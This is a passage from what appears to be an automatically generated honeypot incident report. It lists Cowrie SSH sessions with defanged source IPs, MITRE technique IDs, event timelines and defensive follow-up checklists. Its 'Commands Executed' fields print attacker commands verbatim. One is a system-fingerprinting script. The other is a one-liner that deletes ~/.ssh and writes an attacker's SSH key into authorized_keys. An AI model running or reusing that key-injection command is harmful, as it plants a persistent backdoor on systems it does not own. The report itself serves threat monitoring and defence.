| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:05:54` | `cowrie.session.connect` |
| `2026-09-21 17:05:54` | `cowrie.client.version` |
| `2026-09-21 17:05:54` | `cowrie.client.kex` |
| `2026-09-21 17:05:55` | `cowrie.login.success` |
| `2026-09-21 17:05:56` | `cowrie.session.params` |
| `2026-09-21 17:05:56` | `cowrie.command.input` |
| `2026-09-21 17:05:56` | `cowrie.command.failed` |
| `2026-09-21 17:05:56` | `cowrie.log.closed` |
| `2026-09-21 17:05:57` | `cowrie.session.params` |
| `2026-09-21 17:05:57` | `cowrie.command.input` |
| `2026-09-21 17:05:57` | `cowrie.session.file_download` |
| `2026-09-21 17:05:57` | `cowrie.log.closed` |
| `2026-09-21 17:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-042394e724bc

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-09-21 17:05 |
| **Last Seen** | 2026-09-21 17:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:05:57` | `cowrie.session.connect` |
| `2026-09-21 17:05:57` | `cowrie.client.version` |
| `2026-09-21 17:05:57` | `cowrie.client.kex` |
| `2026-09-21 17:05:58` | `cowrie.login.success` |
| `2026-09-21 17:05:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba02c056b720

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-09-21 17:05 |
| **Last Seen** | 2026-09-21 17:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:05:58` | `cowrie.session.connect` |
| `2026-09-21 17:05:58` | `cowrie.client.version` |
| `2026-09-21 17:05:58` | `cowrie.client.kex` |
| `2026-09-21 17:05:59` | `cowrie.login.success` |
| `2026-09-21 17:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.248.197[.]77` to AbuseIPDB if not already reported
- [ ] Block `186.248.197[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db3583f1fa15

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:06 |
| **Last Seen** | 2026-09-21 17:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:06:54` | `cowrie.session.connect` |
| `2026-09-21 17:06:55` | `cowrie.client.version` |
| `2026-09-21 17:06:55` | `cowrie.client.kex` |
| `2026-09-21 17:06:58` | `cowrie.login.success` |
| `2026-09-21 17:07:00` | `cowrie.session.params` |
| `2026-09-21 17:07:00` | `cowrie.command.input` |
| `2026-09-21 17:07:01` | `cowrie.command.input` |
| `2026-09-21 17:07:01` | `cowrie.command.input` |
| `2026-09-21 17:07:01` | `cowrie.command.input` |
| `2026-09-21 17:07:01` | `cowrie.command.input` |
| `2026-09-21 17:07:01` | `cowrie.command.success` |
| `2026-09-21 17:07:01` | `cowrie.command.input` |
| `2026-09-21 17:07:01` | `cowrie.command.input` |
| `2026-09-21 17:07:01` | `cowrie.command.input` |
| `2026-09-21 17:07:01` | `cowrie.command.input` |
| `2026-09-21 17:07:01` | `cowrie.log.closed` |
| `2026-09-21 17:07:03` | `cowrie.session.params` |
| `2026-09-21 17:07:03` | `cowrie.command.input` |
| `2026-09-21 17:07:04` | `cowrie.log.closed` |
| `2026-09-21 17:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb57f07e64bc

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:09 |
| **Last Seen** | 2026-09-21 17:10 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:09:52` | `cowrie.session.connect` |
| `2026-09-21 17:09:54` | `cowrie.client.version` |
| `2026-09-21 17:09:54` | `cowrie.client.kex` |
| `2026-09-21 17:09:58` | `cowrie.login.success` |
| `2026-09-21 17:10:01` | `cowrie.session.params` |
| `2026-09-21 17:10:01` | `cowrie.command.input` |
| `2026-09-21 17:10:01` | `cowrie.command.input` |
| `2026-09-21 17:10:01` | `cowrie.command.input` |
| `2026-09-21 17:10:01` | `cowrie.command.input` |
| `2026-09-21 17:10:01` | `cowrie.command.input` |
| `2026-09-21 17:10:01` | `cowrie.command.success` |
| `2026-09-21 17:10:01` | `cowrie.command.input` |
| `2026-09-21 17:10:01` | `cowrie.command.input` |
| `2026-09-21 17:10:01` | `cowrie.command.input` |
| `2026-09-21 17:10:01` | `cowrie.command.input` |
| `2026-09-21 17:10:03` | `cowrie.log.closed` |
| `2026-09-21 17:10:06` | `cowrie.session.params` |
| `2026-09-21 17:10:06` | `cowrie.command.input` |
| `2026-09-21 17:10:07` | `cowrie.log.closed` |
| `2026-09-21 17:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c504dc6c7ae5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:11 |
| **Last Seen** | 2026-09-21 17:13 |
| **Session Duration** | 112s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:11:52` | `cowrie.session.connect` |
| `2026-09-21 17:11:53` | `cowrie.client.version` |
| `2026-09-21 17:11:53` | `cowrie.client.kex` |
| `2026-09-21 17:12:15` | `cowrie.login.success` |
| `2026-09-21 17:13:38` | `cowrie.session.params` |
| `2026-09-21 17:13:38` | `cowrie.command.input` |
| `2026-09-21 17:13:38` | `cowrie.command.input` |
| `2026-09-21 17:13:38` | `cowrie.command.input` |
| `2026-09-21 17:13:38` | `cowrie.command.input` |
| `2026-09-21 17:13:38` | `cowrie.command.input` |
| `2026-09-21 17:13:38` | `cowrie.command.success` |
| `2026-09-21 17:13:38` | `cowrie.command.input` |
| `2026-09-21 17:13:38` | `cowrie.command.input` |
| `2026-09-21 17:13:38` | `cowrie.command.input` |
| `2026-09-21 17:13:38` | `cowrie.command.input` |
| `2026-09-21 17:13:39` | `cowrie.log.closed` |
| `2026-09-21 17:13:41` | `cowrie.session.params` |
| `2026-09-21 17:13:41` | `cowrie.command.input` |
| `2026-09-21 17:13:43` | `cowrie.log.closed` |
| `2026-09-21 17:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c77e433ee1f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:14 |
| **Last Seen** | 2026-09-21 17:15 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:14:59` | `cowrie.session.connect` |
| `2026-09-21 17:15:00` | `cowrie.client.version` |
| `2026-09-21 17:15:00` | `cowrie.client.kex` |
| `2026-09-21 17:15:08` | `cowrie.login.success` |
| `2026-09-21 17:15:12` | `cowrie.session.params` |
| `2026-09-21 17:15:12` | `cowrie.command.input` |
| `2026-09-21 17:15:12` | `cowrie.command.input` |
| `2026-09-21 17:15:12` | `cowrie.command.input` |
| `2026-09-21 17:15:12` | `cowrie.command.input` |
| `2026-09-21 17:15:12` | `cowrie.command.input` |
| `2026-09-21 17:15:12` | `cowrie.command.success` |
| `2026-09-21 17:15:12` | `cowrie.command.input` |
| `2026-09-21 17:15:12` | `cowrie.command.input` |
| `2026-09-21 17:15:12` | `cowrie.command.input` |
| `2026-09-21 17:15:12` | `cowrie.command.input` |
| `2026-09-21 17:15:13` | `cowrie.log.closed` |
| `2026-09-21 17:15:17` | `cowrie.session.params` |
| `2026-09-21 17:15:17` | `cowrie.command.input` |
| `2026-09-21 17:15:19` | `cowrie.log.closed` |
| `2026-09-21 17:15:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2284d02b56e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:16 |
| **Last Seen** | 2026-09-21 17:16 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:16:27` | `cowrie.session.connect` |
| `2026-09-21 17:16:29` | `cowrie.client.version` |
| `2026-09-21 17:16:29` | `cowrie.client.kex` |
| `2026-09-21 17:16:37` | `cowrie.login.success` |
| `2026-09-21 17:16:41` | `cowrie.session.params` |
| `2026-09-21 17:16:41` | `cowrie.command.input` |
| `2026-09-21 17:16:41` | `cowrie.command.input` |
| `2026-09-21 17:16:41` | `cowrie.command.input` |
| `2026-09-21 17:16:41` | `cowrie.command.input` |
| `2026-09-21 17:16:41` | `cowrie.command.input` |
| `2026-09-21 17:16:41` | `cowrie.command.success` |
| `2026-09-21 17:16:41` | `cowrie.command.input` |
| `2026-09-21 17:16:41` | `cowrie.command.input` |
| `2026-09-21 17:16:41` | `cowrie.command.input` |
| `2026-09-21 17:16:41` | `cowrie.command.input` |
| `2026-09-21 17:16:43` | `cowrie.log.closed` |
| `2026-09-21 17:16:47` | `cowrie.session.params` |
| `2026-09-21 17:16:47` | `cowrie.command.input` |
| `2026-09-21 17:16:49` | `cowrie.log.closed` |
| `2026-09-21 17:16:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-216a4ab46ea5

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-21 17:17 |
| **Last Seen** | 2026-09-21 17:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:17:23` | `cowrie.session.connect` |
| `2026-09-21 17:17:23` | `cowrie.client.version` |
| `2026-09-21 17:17:23` | `cowrie.client.kex` |
| `2026-09-21 17:17:24` | `cowrie.login.success` |
| `2026-09-21 17:17:26` | `cowrie.direct-tcpip.request` |
| `2026-09-21 17:17:27` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 17:17:27` | `cowrie.direct-tcpip.data` |
| `2026-09-21 17:17:29` | `cowrie.direct-tcpip.request` |
| `2026-09-21 17:17:29` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 17:17:29` | `cowrie.direct-tcpip.data` |
| `2026-09-21 17:17:30` | `cowrie.direct-tcpip.request` |
| `2026-09-21 17:17:31` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 17:17:31` | `cowrie.direct-tcpip.data` |
| `2026-09-21 17:17:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-818816fc0822

| Field | Detail |
|---|---|
| **Source IP** | `190.5.200[.]98` |
| **First Seen** | 2026-09-21 17:18 |
| **Last Seen** | 2026-09-21 17:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:18:28` | `cowrie.session.connect` |
| `2026-09-21 17:18:28` | `cowrie.client.version` |
| `2026-09-21 17:18:28` | `cowrie.client.kex` |
| `2026-09-21 17:18:29` | `cowrie.login.success` |
| `2026-09-21 17:18:30` | `cowrie.session.params` |
| `2026-09-21 17:18:30` | `cowrie.command.input` |
| `2026-09-21 17:18:30` | `cowrie.command.failed` |
| `2026-09-21 17:18:30` | `cowrie.log.closed` |
| `2026-09-21 17:18:30` | `cowrie.session.params` |
| `2026-09-21 17:18:30` | `cowrie.command.input` |
| `2026-09-21 17:18:30` | `cowrie.session.file_download` |
| `2026-09-21 17:18:30` | `cowrie.log.closed` |
| `2026-09-21 17:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.5.200[.]98` to AbuseIPDB if not already reported
- [ ] Block `190.5.200[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b158403cb95c

| Field | Detail |
|---|---|
| **Source IP** | `190.5.200[.]98` |
| **First Seen** | 2026-09-21 17:18 |
| **Last Seen** | 2026-09-21 17:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:18:31` | `cowrie.session.connect` |
| `2026-09-21 17:18:31` | `cowrie.client.version` |
| `2026-09-21 17:18:31` | `cowrie.client.kex` |
| `2026-09-21 17:18:31` | `cowrie.login.success` |
| `2026-09-21 17:18:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.5.200[.]98` to AbuseIPDB if not already reported
- [ ] Block `190.5.200[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d92bce3ab6e

| Field | Detail |
|---|---|
| **Source IP** | `190.5.200[.]98` |
| **First Seen** | 2026-09-21 17:18 |
| **Last Seen** | 2026-09-21 17:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:18:31` | `cowrie.session.connect` |
| `2026-09-21 17:18:31` | `cowrie.client.version` |
| `2026-09-21 17:18:31` | `cowrie.client.kex` |
| `2026-09-21 17:18:31` | `cowrie.login.success` |
| `2026-09-21 17:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.5.200[.]98` to AbuseIPDB if not already reported
- [ ] Block `190.5.200[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bae6f06d4c9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:19 |
| **Last Seen** | 2026-09-21 17:19 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:19:20` | `cowrie.session.connect` |
| `2026-09-21 17:19:22` | `cowrie.client.version` |
| `2026-09-21 17:19:22` | `cowrie.client.kex` |
| `2026-09-21 17:19:28` | `cowrie.login.success` |
| `2026-09-21 17:19:32` | `cowrie.session.params` |
| `2026-09-21 17:19:32` | `cowrie.command.input` |
| `2026-09-21 17:19:32` | `cowrie.command.input` |
| `2026-09-21 17:19:32` | `cowrie.command.input` |
| `2026-09-21 17:19:32` | `cowrie.command.input` |
| `2026-09-21 17:19:32` | `cowrie.command.input` |
| `2026-09-21 17:19:32` | `cowrie.command.success` |
| `2026-09-21 17:19:32` | `cowrie.command.input` |
| `2026-09-21 17:19:32` | `cowrie.command.input` |
| `2026-09-21 17:19:32` | `cowrie.command.input` |
| `2026-09-21 17:19:32` | `cowrie.command.input` |
| `2026-09-21 17:19:34` | `cowrie.log.closed` |
| `2026-09-21 17:19:37` | `cowrie.session.params` |
| `2026-09-21 17:19:37` | `cowrie.command.input` |
| `2026-09-21 17:19:38` | `cowrie.log.closed` |
| `2026-09-21 17:19:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-391e16845e9c

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-21 17:19 |
| **Last Seen** | 2026-09-21 17:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:19:22` | `cowrie.session.connect` |
| `2026-09-21 17:19:22` | `cowrie.client.version` |
| `2026-09-21 17:19:22` | `cowrie.client.kex` |
| `2026-09-21 17:19:23` | `cowrie.login.success` |
| `2026-09-21 17:19:25` | `cowrie.direct-tcpip.request` |
| `2026-09-21 17:19:26` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 17:19:26` | `cowrie.direct-tcpip.data` |
| `2026-09-21 17:19:27` | `cowrie.direct-tcpip.request` |
| `2026-09-21 17:19:27` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 17:19:27` | `cowrie.direct-tcpip.data` |
| `2026-09-21 17:19:28` | `cowrie.direct-tcpip.request` |
| `2026-09-21 17:19:28` | `cowrie.direct-tcpip.ja4` |
| `2026-09-21 17:19:28` | `cowrie.direct-tcpip.data` |
| `2026-09-21 17:19:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a062a00ae08

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:20 |
| **Last Seen** | 2026-09-21 17:20 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:20:41` | `cowrie.session.connect` |
| `2026-09-21 17:20:41` | `cowrie.client.version` |
| `2026-09-21 17:20:41` | `cowrie.client.kex` |
| `2026-09-21 17:20:46` | `cowrie.login.success` |
| `2026-09-21 17:20:50` | `cowrie.session.params` |
| `2026-09-21 17:20:50` | `cowrie.command.input` |
| `2026-09-21 17:20:50` | `cowrie.command.input` |
| `2026-09-21 17:20:50` | `cowrie.command.input` |
| `2026-09-21 17:20:50` | `cowrie.command.input` |
| `2026-09-21 17:20:50` | `cowrie.command.input` |
| `2026-09-21 17:20:50` | `cowrie.command.success` |
| `2026-09-21 17:20:50` | `cowrie.command.input` |
| `2026-09-21 17:20:50` | `cowrie.command.input` |
| `2026-09-21 17:20:50` | `cowrie.command.input` |
| `2026-09-21 17:20:50` | `cowrie.command.input` |
| `2026-09-21 17:20:51` | `cowrie.log.closed` |
| `2026-09-21 17:20:55` | `cowrie.session.params` |
| `2026-09-21 17:20:55` | `cowrie.command.input` |
| `2026-09-21 17:20:56` | `cowrie.log.closed` |
| `2026-09-21 17:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a3a236ea7a9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:22 |
| **Last Seen** | 2026-09-21 17:22 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
